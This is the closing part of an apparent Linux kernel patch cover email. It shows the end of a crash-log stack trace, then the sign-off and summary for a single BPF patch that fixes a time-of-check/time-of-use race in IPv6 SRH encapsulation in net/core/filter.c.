[  276.967905][    C3]  __napi_poll.constprop.0+0xa1/0x440=0D
[  276.968296][    C3]  net_rx_action+0x928/0xe20=0D
[  276.968614][    C3]  ? __pfx_net_rx_action+0x10/0x10=0D
[  276.968966][    C3]  ? rcu_core+0xab2/0x14b0=0D
[  276.969307][    C3]  handle_softirqs+0x2ae/0x8b0=0D
[  276.969626][    C3]  ? __pfx_handle_softirqs+0x10/0x10=0D
[  276.970004][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.970390][    C3]  ? rcu_is_watching+0x12/0xc0=0D
[  276.970711][    C3]  run_ksoftirqd+0x3d/0x70=0D
[  276.971006][    C3]  smpboot_thread_fn+0x521/0x8c0=0D
[  276.971362][    C3]  ? smpboot_thread_fn+0x56/0x8c0=0D
[  276.971732][    C3]  ? __pfx_smpboot_thread_fn+0x10/0x10=0D
[  276.972103][    C3]  ? __pfx_smpboot_thread_fn+0x10/0x10=0D
[  276.972485][    C3]  kthread+0x27e/0x350=0D
[  276.972756][    C3]  ? _raw_spin_unlock_irq+0x28/0x50=0D
[  276.973108][    C3]  ? __pfx_kthread+0x10/0x10=0D
[  276.973424][    C3]  ret_from_fork+0x31/0x70=0D
[  276.973789][    C3]  ? __pfx_kthread+0x10/0x10=0D
[  276.974263][    C3]  ret_from_fork_asm+0x1a/0x30=0D
[  276.974794][    C3]  </TASK>=0D
[  276.975278][    C3] Kernel Offset: disabled=0D
[  276.975641][    C3] Rebooting in 86400 seconds..=0D
=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Luxiao Xu=0D
=0D
Luxiao Xu (1):=0D
  bpf: fix TOCTOU in IPv6 SRH encapsulation=0D
=0D
 net/core/filter.c | 25 +++++++++++++++++--------=0D
 1 file changed, 17 insertions(+), 8 deletions(-)=0D
=0D
-- =0D
2.43.0=0D
